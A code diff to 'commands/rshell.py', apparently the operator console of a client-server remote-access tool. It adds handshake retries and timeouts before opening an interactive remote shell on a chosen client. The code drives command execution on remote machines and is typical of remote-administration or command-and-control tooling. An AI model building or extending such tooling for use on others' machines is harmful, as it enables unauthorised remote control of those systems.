@@ -1,18 +1,39 @@
 # commands/rshell.py
+import socket
 import subprocess
 import threading
+import time
 
 from colorama import Style, Fore
 
 requires_id = True
 
-argumentError = "Invalid arguments. Usage: rshell <client_id>"
+argumentError = "Usage: rshell <client_id>"
 requires_id = True
 
+
+# commands/rshell.py
 def execute(conn, args, clients, id):
     conn.sendall(b'RSHELL')
-    # threading.Thread(target=rshell_thread, args=(conn,), daemon=True).start()
+    conn.settimeout(1)  # Set a timeout of 1 second
+    success = False
+    for i in range(0, 5):
+        try:
+            data = conn.recv(1024)
+            if str(data) == "b'RSHELL.OPEN'":
+                success = True
+                break
+        except socket.timeout:
+            print(Fore.RED + "Error establishing connection to RSHELL. " + Style.RESET_ALL + "Attempt: " + str(
+                i + 1) + "/5")
+        time.sleep(1)
+    conn.settimeout(None)  # Remove the timeout
+    if not success:
+        print(Fore.RED + "Failed to establish connection to RSHELL." + Style.RESET_ALL)
+        return
     rshell_thread(conn)
+
+    # threading.Thread(target=rshell_thread, args=(conn,), daemon=True).start()
 
 
 def rshell_thread(conn):
@@ -32,8 +53,9 @@ def rshell_thread(conn):
                 chunk = conn.recv(1024)
                 if not chunk:
                     break
-                results += chunk # you don't want to strip this, because then you'll lose the newline when the actual result includes a newline
+                results += chunk  # you don't want to strip this, because then you'll lose the newline when the actual result includes a newline
         if results.decode("utf-8").strip() == 'NONE':
-            print(Fore.YELLOW + "Warning:" + Style.RESET_ALL + " No results received. In Windows, this usually means the command succeeded.")
+            print(
+                Fore.YELLOW + "Warning:" + Style.RESET_ALL + " No results received. In Windows, this usually means the command succeeded.")
         else:
             print("<" + hostname + ">: {}".format(results.decode('utf-8')))
